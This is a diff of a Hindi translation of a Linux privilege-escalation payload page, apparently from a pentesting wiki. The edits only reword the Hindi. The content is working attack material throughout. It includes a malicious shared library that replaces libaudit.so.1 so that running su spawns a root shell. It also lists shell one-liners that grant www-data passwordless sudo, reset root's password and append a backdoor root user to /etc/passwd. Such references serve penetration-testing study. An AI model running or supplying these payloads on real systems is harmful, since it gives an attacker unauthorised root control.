@@ -44,14 +44,14 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## privileges escalate करने के लिए file को overwrite करना
+## privileges बढ़ाने के लिए file को overwrite करना
 
 ### सामान्य files
 
-- _/etc/passwd_ में password के साथ user जोड़ें
-- _/etc/shadow_ के अंदर password बदलें
-- _/etc/sudoers_ में user को sudoers में जोड़ें
-- docker socket के माध्यम से docker का दुरुपयोग करें, आमतौर पर _/run/docker.sock_ या _/var/run/docker.sock_ में
+- `/etc/passwd` में password के साथ user जोड़ें
+- `/etc/shadow` के अंदर password बदलें
+- `/etc/sudoers` में user को sudoers में जोड़ें
+- docker socket के माध्यम से Docker का abuse करें, जो आमतौर पर `/run/docker.sock` या `/var/run/docker.sock` में होता है
 
 ### library को overwrite करना
 
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-इस मामले में `/lib/x86_64-linux-gnu/libaudit.so.1` का impersonate करने का प्रयास करते हैं।\
-इसलिए, इस library के उन functions की जाँच करें जिनका उपयोग **`su`** binary करती है:
+इस मामले में `/lib/x86_64-linux-gnu/libaudit.so.1` को impersonate करने का प्रयास करते हैं।\
+तो, **`su`** binary द्वारा उपयोग किए जाने वाले इस library के functions की जाँच करें:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` और `audit_fd` संभवतः libaudit.so.1 library से हैं। चूँकि libaudit.so.1 को malicious shared library द्वारा overwrite कर दिया जाएगा, इसलिए ये symbols नई shared library में मौजूद होने चाहिए; अन्यथा program symbol को खोज नहीं पाएगा और exit हो जाएगा।
+प्रतीक `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` और `audit_fd` संभवतः libaudit.so.1 library से हैं। चूंकि libaudit.so.1 को malicious shared library द्वारा overwrite किया जाएगा, इसलिए ये प्रतीक नई shared library में मौजूद होने चाहिए; अन्यथा program को प्रतीक नहीं मिलेगा और वह exit हो जाएगा।
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,13 +98,13 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-अब, केवल **`/bin/su`** को call करके आपको root के रूप में एक shell मिल जाएगी।
+अब, केवल **`/bin/su`** चलाकर आपको root के रूप में एक shell मिलेगा।
 
 ## Scripts
 
 क्या आप root से कुछ execute करवा सकते हैं?
 
-### **www-data to sudoers**
+### **www-data को sudoers में**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
@@ -112,7 +112,7 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### नया root user जोड़ें
+### /etc/passwd में नया root user जोड़ें
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
